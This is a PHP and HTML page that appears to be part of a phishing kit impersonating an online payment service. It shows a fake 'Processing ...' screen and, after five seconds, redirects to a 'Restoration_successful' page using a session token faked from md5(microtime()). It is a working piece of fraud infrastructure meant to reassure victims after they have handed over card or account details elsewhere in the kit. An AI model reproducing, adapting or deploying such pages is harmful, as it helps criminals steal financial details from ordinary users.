<?php
$x=md5(microtime());
echo "<META HTTP-EQUIV='refresh' content='5; URL=websc-success.php?Go=_Restoration_successful&_SESSION=$x$x'>";
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  	<title>Please Complete with Your Informations</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  		<link rel="shortcut icon" href="img/favicon.ico">
		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
    </head>    
    		<body id="settings">
		    		<div id="page">
		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
					<div class="upbar"></div>
				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">
     		<section id="main" role="main">
<div class="column_24">
<div class="one column nogutter">
<div id="prfLeftNav">
	 	<div class="menu4"></div>
		</br>
		<div class="enable"></div>
</div>
<div class="mainContentFrame-bnk">
	<div id="prfMainContentWrapper-bnk" aria-live="polite">
	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<div><center>
<img src="img/processing.gif" style="padding-top:160px;"/>
<span style="font-size:15px;"></br></br>Processing ...</span>
</center></div>
</div>	
	</div>
	</div>
</div>
			</div>
</div>
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>
    	<script src="./bill_files/c9a42309d6e427a3cf00f2a5a575f0.js" type="text/javascript"></script>
    	<script src="./bill_files/bf561559bd294ab8108d9a22c0c66.js" type="text/javascript"></script>    	
		<script type="text/javascript" src="./bill_files/pp_jscode_080706.js"></script>
		<script type="text/javascript" src="./bill_files/pa.js"></script>
</div><div></div></body></html>